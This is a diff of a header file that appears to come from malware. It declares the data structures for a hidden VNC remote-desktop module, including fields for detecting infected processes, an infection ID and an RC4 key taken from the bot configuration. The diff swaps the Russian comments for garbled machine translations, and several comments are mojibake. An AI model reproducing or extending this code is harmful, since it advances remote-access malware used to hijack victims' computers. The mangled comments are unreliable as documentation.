@@ -5,125 +5,129 @@
 
 #if(BO_VNC > 0)
 
-//Максимальный размер битмапа.
+//The maximum size of the bitmap.
 #define MAX_BITMAP_SIZE (4000 * 4000 * 4)
 
-//Время даблклика.
+//Time dablklika.
 #define MOUSE_DOUBLE_CLICK_DELAY 1000
 
-//Таймаут для SendMessageTimeoutW().
+//Timeout for SendMessageTimeoutW ().
 #define SENDMESSAGE_TIMEOUT 100
 
-//Условие, что поток работате в VNC-десктопе.
+//Condition that the flow not worked in the VNC-desktop.
 #define IS_VNC_PROCESS (coreData.proccessFlags & Core::CDPF_VNC_ACTIVE && Core::isActive())
 
-//Типы сообщений VNC (wParam).
+//Message Types VNC (wParam).
 enum vncMessages:WPARAM
 {
-  VMW_EXECUTE_MENU    = (WPARAM)-1, //Исполнить команду меню
-  VMW_HILITE_MENU     = (WPARAM)-2, //Подцветить команду меню.
-  VMW_UPDATE_KEYSTATE = (WPARAM)-3, //Обновить состояние клавиш для потока.
-  VMW_REMOTE_PAINT    = (WPARAM)-4  //Прорисовать удаленноеокно указное в lParam
+  VMW_EXECUTE_MENU    = (WPARAM)-1, //Execute the menu command
+  VMW_HILITE_MENU     = (WPARAM)-2, //Podtsvetit menu command.
+  VMW_UPDATE_KEYSTATE = (WPARAM)-3, //Update the state of the keys for the stream.
+  VMW_REMOTE_PAINT    = (WPARAM)-4  //Draw the udalennoeokno ukaznoe in lParam
 };
 
-//Флаги классов окон.
+//Flags window class.
 enum
 {
-  WCF_PAINTMETHOD_NOP         = 0x01, //Не рисовать.
-  WCF_PAINTMETHOD_PAINT       = 0x02, //Перехват BeginPaint/EndPaint и т.д.
+  WCF_PAINTMETHOD_NOP         = 0x01, //Do not draw.
+  WCF_PAINTMETHOD_PAINT       = 0x02, //Interception BeginPaint / EndPaint etc.
   WCF_PAINTMETHOD_PRINT       = 0x04, //WM_PRINT.
   WCF_PAINTMETHOD_PRINTWINDOW = 0x08, //PrintWindow.
-  WCF_PAINTMETHOD_SKIP_HOOK   = 0x10, //Не вызыват через VNCPROCESSDATA.vncMessage.
-  WCF_MOUSE_CLIENT_TO_SCREEN  = 0x20, //Отправлять все мышиные сообщения с координатами отностельно экрана.
-  WCF_MOUSE_AUTOCAPTURE       = 0x40, //Автоматически променять SetCapture при наведении попадании мышы на окно.
+  WCF_PAINTMETHOD_SKIP_HOOK   = 0x10, //РќРµ РІС‹Р·С‹РІР°С‚ С‡РµСЂРµР· VNCPROCESSDATA.vncMessage.
+
+  WCF_MOUSE_CLIENT_TO_SCREEN  = 0x20, //Send all mouse messages with coordinates otnostelno screen.
+  WCF_MOUSE_AUTOCAPTURE       = 0x40, //Automatically exchange SetCapture hover myshy hit the window.
 };
 
-//Глобальные данные VNC, проэктируются как OBJECT_ID_VNC_DATA_MAPFILE.
+//Global data VNC, proektiruyutsya as OBJECT_ID_VNC_DATA_MAPFILE.
 typedef struct
 {
-  BYTE keysState[256];      //Сосотояние кнопок мыши и клавиатуры.
-  POINT cursorPoint;        //Координты курсора.
+  BYTE keysState[256];      //Sosotoyanie mouse buttons and keyboard.
+  POINT cursorPoint;        //Koordinty cursor.
   
-  //Данные для эмуляции SetCapture().
+  //Data to emulate SetCapture ().
   struct
   {
-    HWND window; //Окно с устанвленным захватом.
-    DWORD tid;   //TID окна с захватом.
-    WORD area;   //Область с которой начался захват, служит только для перемешения окон.
+    HWND window; //Window with ustanvlennym grip.
+    DWORD tid;   //TID window to capture.
+    WORD area;   //Region from which the seizure began, serves only to Mixing Capacity windows.
   }mouseCapture;
 
-  //Данные для процесса рисования.
+  //The data for the process of drawing.
   struct
   {
-    RECT ownerRect;  //Координаты родителя окна.
-    bool retVal;     //Код возврата рисования.
+    RECT ownerRect;  //The coordinates of the parent window.
+    bool retVal;     //Return code of drawing.
   }paintProcess;
 }VNCGLOBALDATA;
 
-//Данные VNC-процесса.
+//These VNC-process.
 typedef struct
 {
-  HANDLE mapFileHandle;      //Хэндл map-файла для всех процессов. (Core::OBJECT_ID_VNC_MAPFILE)
-  DWORD tlsPaintIndex;       //TLS-индекс PAINTDATA.
-  DWORD vncMessage;          //Оконное сообщение для копирования контекста окна или обнволения состояния глобальных данных
-  HANDLE vncMessageEvent;    //Событие окончания выполенния vncMessage.
-  VNCGLOBALDATA *globalData; //Глобальные данные.
-  HANDLE globalDataMutex;    //Мютекс для globaData.
+  HANDLE mapFileHandle;      //The handle of the map-file for all processes. (Core:: OBJECT_ID_VNC_MAPFILE)
+  DWORD tlsPaintIndex;       //TLS-index PAINTDATA.
+  DWORD vncMessage;          //Window message to copy the contents of a window or obnvoleniya state of global data
+  HANDLE vncMessageEvent;    //Event end meet the following vncMessage.
+  VNCGLOBALDATA *globalData; //Global data.
+  HANDLE globalDataMutex;    //Myuteks for globaData.
   
-  //Данные для работы с DIB.
+  //Data to work with DIB.
   struct
   {
-    LPBYTE desktop;       //Битмап десктопа, который рисуется для VNC-клиента.
+    LPBYTE desktop;       //Bitmap desktop, which is drawn for the VNC-client.
 
-    //Временный битмап, в который рисуется каждое окно по отдельности.
-    HBITMAP tempHandle;   //Хэндл.
-    LPBYTE temp;          //Байты.
+    //Temporary bitmap, which is drawn each window separately.
+    HBITMAP tempHandle;   //Handle.
+    LPBYTE temp;          //Bytes.
 
-    RECT rect;            //Координаты десктопа (0, 0, width, height).
-    DWORD widthInBytes;   //Ширина битмапа в пикселях, включая выравнивание.
-    BYTE pixelSize;       //Размер пикселя в байтах.
+    RECT rect;            //The coordinates of the desktop (0, 0, width, height).
+    DWORD widthInBytes;   //Width of bitmap in pixels, including the alignment.
+    BYTE pixelSize;       //Pixel size in bytes.
   }dib;
 
-  //Данные VNC-клиента. Используется серверной частьюы.
+  //These VNC-client. Used the server chastyuy.
   struct
   {    
-    //Данные необходимые для обнаружения зараженных процессов. 
+    //Data necessary to detect infected processes.
     struct
     {
       GUID osGuid;             //PESETTINGS.osGuid.
+
       DWORD processInfecionId; //PESETTINGS.processInfecionId.
+
       Crypt::RC4KEY baseKey;   //BASECONFIG.rc4Key.
+
     }processDetectionData;
 
     //DC
     struct
     {
-      HDC dc;                            //Memory DC в который будет рисоваться десктоп.
-      HBITMAP orginalBitmap;             //Первоночальный битмап.
-      HBITMAP sampleBitmap;              //Битмап с правильным количетсво цвета.
-      HANDLE paintMutex;                 //Мютекс рисования окон.
+      HDC dc;                            //Memory DC which will be painted on the desktop.
+      HBITMAP orginalBitmap;             //Originally bitmap.
+      HBITMAP sampleBitmap;              //Kolichetsvo bitmap with the correct color.
+      HANDLE paintMutex;                 //Myuteks drawing windows.
     }dcData;
 
-    //Состояние мыши.
+    //State of the mouse.
     struct
     {
-      DWORD lastDownTime;      //Время последненго нажатия кнопки мыши.
-      DWORD lastDownMessage;   //Сообшение последнего нажатия кнопки мыши.
-      HWND lastDownWindow;     //Окно, в которым был произведено нажатие.
-      HWND lastTopLevelWindow; //Последнее TOP-окно, в котором присходило нажатие.
+      DWORD lastDownTime;      //Time poslednengo click.
+      DWORD lastDownMessage;   //Your Message last click.
+      HWND lastDownWindow;     //Window, which was produced by pressing.
+      HWND lastTopLevelWindow; //Last TOP-box in which prishodilo depression.
       HWND lastActiveWindow;
       DWORD lastActiveThreadId;
     }input;
 
-    PROCESS_INFORMATION paintProcess; //Данные процесса рисования.
+    PROCESS_INFORMATION paintProcess; //These process of drawing.
   }serverData;
 }VNCPROCESSDATA;
 
 extern VNCPROCESSDATA vncActiveProcessData;
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-//Функции.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//Function.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
   Рисование декстопа.
@@ -186,15 +190,13 @@ WORD updateInputState(VNCPROCESSDATA *vncProcessData, BYTE virtualKey, bool down
 */
 WORD getWindowClassFlags(HWND window);
 
-/*
-  Проверяет инифицирован ли процесс окна.
+/*В В Inifitsirovan checks whether the process window.
 
-  IN vncProcessData - VNCPROCESSDATA.
-  IN window         - окно.
+В В IN vncProcessData - VNCPROCESSDATA.
+В В IN window - the window.
 
-  Return            - true - инифицирован,
-                      false - не инифицирован.
-*/
+В В Return - true - inifitsirovan,
+В В В В В В В В В В В В В В В В В В В В В В false - do not inifitsirovan.*/
 bool isWindowInfected(VNCPROCESSDATA *vncProcessData, HWND window);
 
 #endif
